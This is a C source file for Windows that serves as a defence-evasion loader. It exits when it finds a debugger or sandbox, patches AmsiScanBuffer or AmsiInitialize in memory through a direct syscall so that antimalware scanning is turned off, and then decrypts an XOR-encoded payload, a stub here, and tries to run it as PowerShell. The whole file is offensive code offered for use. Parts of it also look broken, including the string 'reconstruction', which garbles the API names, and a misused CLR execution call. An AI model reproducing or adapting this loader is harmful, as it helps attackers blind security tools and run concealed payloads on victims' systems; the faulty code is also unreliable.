#include <windows.h>
#include <metahost.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "mscoree.lib")

#define NtCurrentProcess() ((HANDLE)-1)

// Polymorphic string reconstruction
char* reconstructDynamic(const char* base, int seed) {
    size_t len = strlen(base);
    char* reconstructed = malloc(len + 1);
    if (!reconstructed) return NULL;

    for (size_t i = 0; i < len; i++) {
        reconstructed[i] = base[i] ^ ((seed + i) % 7);
    }
    reconstructed[len] = '\0';
    return reconstructed;
}

// Check for debugging or sandboxing
int isSandboxedOrDebugged() {
    BOOL isDebugger = FALSE;
    CheckRemoteDebuggerPresent(NtCurrentProcess(), &isDebugger);
    if (isDebugger) return 1;

    char* suspiciousNames[] = {"SbieDll.dll", "VBoxGuest.dll", "vmtoolsd.exe"};
    for (int i = 0; i < sizeof(suspiciousNames) / sizeof(char*); i++) {
        if (GetModuleHandleA(suspiciousNames[i])) return 1;
    }

    return 0;
}

// Dynamically resolve functions
FARPROC resolveApi(LPCSTR moduleName, LPCSTR procName) {
    HMODULE hModule = LoadLibraryA(moduleName);
    return hModule ? GetProcAddress(hModule, procName) : NULL;
}

// Indirect Syscall Execution via trampoline
__declspec(naked) NTSTATUS syscallStompProtectMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG RegionSize, ULONG NewProtect, PULONG OldProtect) {
    __asm {
        mov r10, rcx
        mov eax, 0x50 // Syscall number for NtProtectVirtualMemory
        syscall
        ret
    }
}

// Patch AMSI dynamically
void patchAmsi() {
    char* amsiLibName = reconstructDynamic("amsi.dll", time(NULL));
    HMODULE amsiModule = LoadLibraryA(amsiLibName);
    free(amsiLibName);

    if (!amsiModule) {
        printf("Failed to load AMSI module.\n");
        return;
    }

    char* amsiScanName = reconstructDynamic("AmsiScanBuffer", time(NULL));
    void* amsiScanLocation = resolveApi("amsi.dll", amsiScanName);
    free(amsiScanName);

    if (amsiScanLocation) {
        ULONG oldProtect;
        SIZE_T regionSize = 0x1000;
        if (syscallStompProtectMemory(NtCurrentProcess(), &amsiScanLocation, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
            unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax, eax; ret
            memcpy(amsiScanLocation, patch, sizeof(patch));
            syscallStompProtectMemory(NtCurrentProcess(), &amsiScanLocation, &regionSize, oldProtect, &oldProtect);
            printf("AmsiScanBuffer patched successfully.\n");
        } else {
            printf("Failed to patch AmsiScanBuffer.\n");
        }
    } else {
        printf("AmsiScanBuffer not found, attempting AmsiInitialize.\n");
        char* amsiInitName = reconstructDynamic("AmsiInitialize", time(NULL));
        void* amsiInitLocation = resolveApi("amsi.dll", amsiInitName);
        free(amsiInitName);

        if (amsiInitLocation) {
            ULONG oldProtect;
            SIZE_T regionSize = 0x1000;
            if (syscallStompProtectMemory(NtCurrentProcess(), &amsiInitLocation, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                unsigned char patch[] = {0xC3}; // ret
                memcpy(amsiInitLocation, patch, sizeof(patch));
                syscallStompProtectMemory(NtCurrentProcess(), &amsiInitLocation, &regionSize, oldProtect, &oldProtect);
                printf("AmsiInitialize patched successfully.\n");
            } else {
                printf("Failed to patch AmsiInitialize.\n");
            }
        }
    }
}

// Encrypted PowerShell command execution
void executeEncryptedPowerShell(const char* encryptedCommand, int key) {
    size_t len = strlen(encryptedCommand);
    char* decryptedCommand = malloc(len + 1);
    if (!decryptedCommand) return;

    for (size_t i = 0; i < len; i++) {
        decryptedCommand[i] = encryptedCommand[i] ^ key;
    }
    decryptedCommand[len] = '\0';

    HRESULT hr;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICLRRuntimeHost* pRuntimeHost = NULL;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
    if (FAILED(hr)) return;

    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pRuntimeInfo));
    if (FAILED(hr)) return;

    hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&pRuntimeHost));
    if (FAILED(hr)) return;

    hr = pRuntimeHost->Start();
    if (FAILED(hr)) return;

    WCHAR psCommand[1024];
    swprintf(psCommand, L"System.Management.Automation.PowerShell.Create().AddScript('%hs').Invoke();", decryptedCommand);

    hr = pRuntimeHost->ExecuteInDefaultAppDomain(psCommand, L"MyAssembly", L"MyType", L"MyMethod", NULL, NULL);

    free(decryptedCommand);
    pRuntimeHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();
}

int main() {
    if (isSandboxedOrDebugged()) {
        printf("Sandbox or debugger detected. Exiting.\n");
        return -1;
    }

    printf("Patching AMSI...\n");
    patchAmsi();

    printf("Executing encrypted PowerShell command...\n");
    const char* encryptedCommand = "\x15\x13\x12..."; // Example XOR-encrypted payload
    executeEncryptedPowerShell(encryptedCommand, 42); // Decrypt with key 42

    return 0;
}
